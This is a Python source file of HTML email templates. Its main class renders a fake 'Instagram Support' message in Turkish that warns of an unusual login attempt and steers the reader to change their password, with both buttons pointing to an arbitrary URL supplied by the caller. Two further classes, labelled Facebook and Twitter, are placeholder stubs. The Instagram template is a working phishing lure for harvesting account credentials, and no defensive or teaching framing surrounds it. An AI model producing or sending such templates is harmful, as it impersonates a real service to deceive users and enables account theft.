
class Instagram:
    def __init__(self, username,url):
        self.username = username
        self.url = url

    def content(self):
        htmlContent = f"""
<!DOCTYPE html>
<html lang="tr" style="
margin:0;
padding:0;
">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Support</title>
</head>
<body>
    <div style="
    width:100%;
    height:auto;
    ">
    <img src="https://qph.fs.quoracdn.net/main-qimg-97343310825c2165d3f205b1364755a1.webp" alt=""
    style="
    width:150px;
    height:auto;
    background-size:cover;
    margin:0px auto;
    margin-bottom:10px;
    ">
    <br>
    <img src="https://img.piri.net/resim/imagecrop/2017/07/20/08/41/resized_0bf36-1c6cdbc5googlemaps.jpg" alt="" style="
   width:100%;
    height:auto;
    margin:0px auto;
    background-size:cover;
    ">
    <h1 style="
    font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    font-weight:400;
    margin:8px auto;
    text-align:center;
    margin-bottom:0;
    ">{self.username}</h1>
    <h1 style="
    font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    font-weight:400;
    text-align:center;
    margin:15px auto;
    font-size:27px;
    ">
        Olağandışı Bir Giriş Denemesi Saptadık
    </h1>
    <h1 style="
    font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    font-weight:600;
    text-align:center;
    margin:3px auto;
    font-size:20px;
    ">
        Android | 11:57AM Istanbul Turkey 
    </h1>
    <p style="
    max-width:400px;
    width:95%;
    text-align:center;
    font-size:20px;
    margin:10px auto;
    font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    font-weight:400;
    "
    >
        Hesabını güvene almak için şifreni değiştir. Eğer bunu sen yaptıysan bize bildir.
    </p>
    <a href="{self.url}" style="
    padding-left: 70px;
    padding-top: 10px;
    width: 200px;
    height:40px;
    margin:3px auto;
    text-decoration:none;
    background-color:#3797EE;
    border:1px solid #3797EE;
    display:flex;
    color:white;
    font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    font-size:20px;
    border-radius:5px;
    margin-bottom:5px;
    "
    >Şifreni Değiştir</a>
    <a href="{self.url}" style="
    padding-left: 70px;
    padding-top: 10px;
    width: 200px;
    height:40px;
    margin:0px auto;
    text-decoration:none;
    border:1px solid gray;
    display:flex;
    align-items:center;
    justify-content:center;
    color:black;
    font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    font-size:20px;
    border-radius:5px;
    "
    >Bunu Ben Yaptım</a>
    </div>
</body>
</html>
        """
        return htmlContent


class Facebook:
    def __init__(self, username,url):
        self.username = username
        self.url = url

    def content(self):
        htmlContent = f"""
        <!DOCTYPE html>
        <html>
        <head>
        </head>
        <body>
        <div style="
        width:100%;
        height:200px;
        background-color:lime;
        ">
            <h1>{self.username}</h1>
            <h1>{self.url}</h1>
        </div>

        </body>
        </html>
        """
        return htmlContent



class Twitter:
    def __init__(self, username):
        self.username = username

    def content(self):
        htmlContent = f"""
        <!DOCTYPE html>
        <html>
        <head>
        </head>
        <body>
        <div style="
        width:100%;
        height:200px;
        background-color:lime;
        ">
            <h1>{self.username}</h1>
        </div>

        </body>
        </html>
        """
        return htmlContent